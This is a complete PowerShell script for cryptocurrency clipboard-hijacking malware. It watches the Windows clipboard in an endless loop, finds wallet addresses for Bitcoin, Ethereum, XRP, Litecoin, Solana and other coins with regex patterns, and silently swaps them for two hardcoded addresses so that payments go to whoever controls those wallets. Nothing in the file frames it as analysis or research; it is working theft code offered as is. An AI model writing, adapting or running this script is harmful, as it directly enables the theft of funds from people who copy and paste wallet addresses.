Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName System.Windows.Forms

# Define the regex patterns for different crypto wallets
$BTCPattern = '^(1|3|[A-HJ-NP-Za-km-z])[a-zA-Z0-9]{25,34}$'
$ETHPattern = '^0x[a-zA-Z0-9]{40}$'
$XRPPattern = '^(r|X)[a-zA-Z0-9]{24,33}$'
$LTCPattern = '^[LM][a-zA-Z0-9]{25,34}$'
$BCHPattern = '^(1|q)[a-zA-Z0-9]{25,42}$'
$USDTBTCPattern = '^(1|3)|bc1[a-zA-Z0-9]{25,34}$'
$USDTETHPattern = '^0x[a-zA-Z0-9]{40}$'
$USDTTRC20Pattern = '^T[a-zA-Z0-9]{33}$'
$BEP20Pattern = '^0x[a-zA-Z0-9]{42}$'
$MATICPattern = '^0x[a-zA-Z0-9]{40}$'
$SolanaPattern = '^[A-Za-z0-9]{32,44}$'

# Define the replacement addresses
$BTCReplacement = '1LF2rwF6NoaXr6rAWJLoiz5vyjKjXjScLf'
$ReplacementAddress = '0x2D68a287902752924C7821aAEB3556E27aA36964'

# Define a variable to keep track of the previous clipboard contents
$PreviousClipboard = ''

while ($true) {
    # Get the current clipboard contents
    $Clipboard = [Windows.Clipboard]::GetText()

    # Check if the clipboard has changed
    if ($Clipboard -ne $PreviousClipboard) {
        # Search for matches
        $Matches = @()
        $RegexPatterns = @($BTCPattern, $ETHPattern, $XRPPattern, $LTCPattern, $BCHPattern, $USDTBTCPattern, $USDTETHPattern, $USDTTRC20Pattern, $BEP20Pattern, $MATICPattern, $SolanaPattern)
        foreach ($Pattern in $RegexPatterns) {
            $Matches += Select-String -InputObject $Clipboard -Pattern $Pattern -AllMatches | Foreach-Object {$_.Matches.Value}
        }

        # Replace any found crypto addresses with the appropriate replacement address
        foreach ($Match in $Matches) {
            if ($Match -match $BTCPattern) {
                $Clipboard = $Clipboard -replace $Match, $BTCReplacement
            } else {
                $Clipboard = $Clipboard -replace $Match, $ReplacementAddress
            }
        }

        # Set the modified clipboard contents
        try {
            [Windows.Clipboard]::SetText($Clipboard)
        } catch {
            # Unable to modify clipboard contents
        }

        # Update the previous clipboard contents
        $PreviousClipboard = $Clipboard
    }

    # Wait for a short time before checking the clipboard again
    Start-Sleep -Milliseconds 500
}

